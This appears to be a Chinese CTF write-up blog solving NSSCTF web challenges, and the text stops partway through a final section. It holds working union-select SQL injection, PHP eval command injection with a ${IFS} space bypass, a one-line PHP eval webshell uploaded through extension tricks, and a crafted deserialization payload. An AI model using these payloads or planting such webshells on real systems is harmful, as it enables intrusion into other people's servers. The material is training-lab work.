<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="string">-1</span>&#x27; union select 1,group_concat(flag),3 from test_db.test_tb; --+</span><br><span class="line">Your Login name:NSSCTF&#123;77d82ad5<span class="string">-3</span>a97<span class="string">-47</span>f0<span class="string">-9</span>c23-a4a92bc9d6f7&#125;</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></div>
<p>这里最后知道是什么数据库什么表就写from <code>$database.$table</code>就可以了 </p>
<h1 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>php中这个eval函数会执行括号中的东西，这里就是执行用GET请求得到的<code>url</code>参数<br>所以先看看有什么文件，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">?url=<span class="keyword">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>这里system函数代表执行系统的指令，这里需要了解一些基础的linux指令<br>直接用ls看当前目录的文件发现没有flag,说明在其他目录下，所以看看根目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">?url=<span class="built_in">system</span>(<span class="string">&quot;ls%20/&quot;</span>);</span><br><span class="line">bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="built_in">var</span></span><br><span class="line">?url=<span class="built_in">system</span>(<span class="string">&quot;cat%20/flllllaaaaaaggggggg&quot;</span>);</span><br><span class="line">NSSCTF&#123;<span class="number">120b1080</span>-93f5-4de0-a68a-2b4748941b4b&#125;</span><br></pre></td></tr></table></figure></div>
<p>一些常用的系统指令执行函数：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>
<h1 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h1><p>题目给了一张图片，显示的是标准的一句话木马<br><img src="https://pic1.imgdb.cn/item/67aeb1a0d0e0a243d4ff04ca.png"><br>这里的后门就是wllm，题目中的caidao指的就是中国菜刀，用蚁剑打开<br>添加数据，密码是wllm<br><img src="https://pic1.imgdb.cn/item/67aeb1f6d0e0a243d4ff04ee.png"><br>打开之后在根目录找到flag</p>
<h1 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h1><p>题目 ：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">Please <span class="keyword">use</span> <span class="string">&#x27;WLLM&#x27;</span> browser!</span><br></pre></td></tr></table></figure></div>

<p>看着题目的意思应该是要修改http的请求头<br>用burpsuite打开，这个是一个专门用来抓包的工具<br>抓到包之后发送到重放模块，因为提示是<code>browser</code>所以修改<code>User-Agent: WLLM</code><br>返回结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Feb 2025 03:07:56 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>./a.php</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">success</span></span></span><br></pre></td></tr></table></figure></div>

<p>这里的Location变了，我们就去这个a.php中<br>出现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">You can only <span class="built_in">read</span> this <span class="keyword">at</span> <span class="keyword">local</span>!</span><br><span class="line">Your address112<span class="number">.49</span><span class="number">.145</span><span class="number">.11</span></span><br></pre></td></tr></table></figure></div>

<p>所以我们要添加一个<code>X-Forwarded-For</code>参数<br>X-Forwarded-For（XFF）是一个HTTP请求头字段，通常用于标识客户端的真实IP地址，即使请求经过了多个代理或负载均衡服务器。<br>抓到这个a.php的包，然后加上这个参数，值用本地的<code>127.0.0.1</code><br>这里我用bp发这个包还是没有给我跳转<br><img src="https://pic1.imgdb.cn/item/67aeb6eed0e0a243d4ff066a.png"><br>所以用hackbar试试，hackbar可以直接跳转<br><img src="https://pic1.imgdb.cn/item/67aeb722d0e0a243d4ff06a7.png"></p>
<h1 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> 小饼干最好吃啦！</span><br></pre></td></tr></table></figure></div>

<p>所以把COOKIE中的<code>admin</code>值改成1<br>hackbar中修改请求头，出现<code>rasalghul.php</code><br><img src="https://pic1.imgdb.cn/item/67aec09dd0e0a243d4ff0bb3.png"><br>访问这个php之后又给出另一个源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里就是过滤了空格，然后执行url参数的命令 我们可以用${IFS}绕过<br>$IFS（Internal Field Separator）是 Bash 里的内部字段分隔符，默认是空格。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">url</span>=ls$&#123;IFS&#125;/</span><br><span class="line">bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root <span class="built_in">run</span> sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">?<span class="attribute">url</span>=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</span><br><span class="line">NSSCTF&#123;02db5dc7-82af-4e14-801c-9262db2b51f6&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>没有直接给出题目,查看源码也没有信息，所以我去扫一下目录，dirsearch工具可以去我kali工具笔记blog查看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://node4.anna.nssctf.cn:28921/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node4.anna.nssctf.cn_28921/__25-02-14_12-18-25.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node4.anna.nssctf.cn:<span class="number">28921</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">25</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">309</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">314</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">313</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span>                                     </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">311</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">302</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">303</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">309</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">308</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/flag.php</span>                                         </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">54</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">35</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">55</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">55</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">311</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><code>flag.php</code>中没有东西，去robots.php中看看，发现又给了一个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://node4.anna.nssctf.cn:28921/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /cl45s.php</span><br></pre></td></tr></table></figure></div>
<p>访问得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>考查的是php反序列化，这里通过GET请求接受p参数，然后将p反序列化<br><code>序列化：在php在对象是一个类的实例化，在为对象赋值后，为了将数据完整的保存起来，php提供了一个函数serialize（） ，他会将对象变成一种特殊的字符串</code><br>根据代码，我们就是要让$this-&gt;admin &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D; “ctf”<br>本地创建php代码,然后得到按照要求得出一个符合要求的序列化之后的字符串，然后用p参数传入，让他反序列化</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();  <span class="comment">//创建一个wllm类</span></span><br><span class="line"><span class="comment">//修改admin和passwd参数</span></span><br><span class="line"><span class="variable">$a</span> -&gt; admin = <span class="string">&quot;admin&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span> -&gt; passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>拿到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?p</span>=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;wllm&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;passwd&quot;</span></span>;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">&quot;ctf&quot;</span></span>;&#125;</span><br><span class="line"><span class="variable constant_">NSSCTF</span>&#123;53d996d2-26ff-<span class="number">4708</span>-b963-b1021be87229&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h1><p><img src="https://pic1.imgdb.cn/item/67af1312d0e0a243d4ff2fff.png"><br>如果我随便上传一张照片会显示图片太大<br>如果我直接上传一个php又会提示<code>想啥呢</code><br>但是这里只是在前端做了验证，我把这个php文件后缀改成.jpg就成功上传了<br>php中是一句话木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./upload/<span class="number">1</span>.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure></div>
<p>但是这样还不能直接利用，因为我们的一句话木马是php文件，需要用bp抓包然后改后缀名<br><img src="https://pic1.imgdb.cn/item/67af15a9d0e0a243d4ff310b.png"><br>只要改后缀名，Content-Type不要改<br><img src="https://pic1.imgdb.cn/item/67af1644d0e0a243d4ff3230.png"><br>但是在蚁剑中找到的flag.php中的flag不是真的flag（格式不对<br>所以我们在蚁剑的终端中输入<code>php -i</code>显示php的信息(效果和phpinfo()一样)<br>在environment中找到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">Environment</span><br><span class="line"><span class="keyword">Variable</span> =&gt; Value</span><br><span class="line">PHP_UPLOAD_MAX_FILESIZE <span class="comment">=&gt; 10M</span></span><br><span class="line">SUPERVISOR_GROUP_NAME <span class="comment">=&gt; apache2</span></span><br><span class="line">HOSTNAME <span class="comment">=&gt; 508d19edf32d40f8</span></span><br><span class="line">SHLVL <span class="comment">=&gt; 0</span></span><br><span class="line">OLDPWD <span class="comment">=&gt;</span> /app/<span class="comment">upload</span></span><br><span class="line">APACHE_RUN_DIR <span class="comment">=&gt;</span> /var/<span class="comment">run</span>/apache2</span><br><span class="line">APACHE_PID_FILE =&gt; /<span class="comment">var</span>/run/<span class="comment">apache2</span>/apache2.pid</span><br><span class="line">PHP_POST_MAX_SIZE =&gt; <span class="number">10</span>M</span><br><span class="line">PATH =&gt; /<span class="comment">usr</span>/local/<span class="comment">sbin:</span>/usr/<span class="comment">local</span>/bin:/<span class="comment">usr</span>/sbin:/<span class="comment">usr</span>/bin:/<span class="comment">sbin:</span>/bin:/<span class="comment">usr</span>/local/<span class="comment">sbin:</span>/usr/<span class="comment">local</span>/bin:/<span class="comment">usr</span>/sbin:/<span class="comment">usr</span>/bin:/<span class="comment">sbin:</span>/bin</span><br><span class="line">APACHE_LOCK_DIR =&gt; /<span class="comment">var</span>/lock/<span class="comment">apache2</span></span><br><span class="line">LANG <span class="comment">=&gt; C</span></span><br><span class="line">SUPERVISOR_ENABLED <span class="comment">=&gt; 1</span></span><br><span class="line">DEBIAN_FRONTEND <span class="comment">=&gt; noninteractive</span></span><br><span class="line">APACHE_RUN_USER <span class="comment">=&gt; www-data</span></span><br><span class="line">APACHE_RUN_GROUP <span class="comment">=&gt; www-data</span></span><br><span class="line">APACHE_LOG_DIR <span class="comment">=&gt;</span> /var/<span class="comment">log</span>/apache2</span><br><span class="line">SUPERVISOR_SERVER_URL =&gt; unix:<span class="comment">///var/run/supervisor.sock</span></span><br><span class="line">SUPERVISOR_PROCESS_NAME =&gt; apache2</span><br><span class="line">PWD =&gt; /<span class="comment">var</span>/www/<span class="comment">html</span>/upload</span><br><span class="line">FLAG =&gt; NSSCTF&#123;efc6307a-ada5<span class="number">-4</span>ef6-bd9e<span class="number">-4</span>eb12544051b&#125;</span><br></pre></td></tr></table></figure></div>
<p>这题还是有点搞了，给了一个假的flag。。 主要是要懂抓包改后缀上传一句话木马，如果不用蚁剑也可以用hackbar用POST请求传入，让<code>a = phpinfo();</code>也可以找到flag，不过第一感觉还是去蚁剑里面的目录找吧</p>
<h1 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h1><p>这题题面和上一题一样，但是他在后端做了校验，如果还是用bp修改后缀会显示php是不行滴<br>这里要了解一个知识点：php3，php5，pht，phtml，phps 都是 php 可运行的文件扩展名<br>所以我们尝试改成其他的后缀名试试,成功上传，然后和上题一样用蚁剑连接找到flag(真flag)<br><img src="https://pic1.imgdb.cn/item/67af1982d0e0a243d4ff34e7.png"></p>
<h1 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span 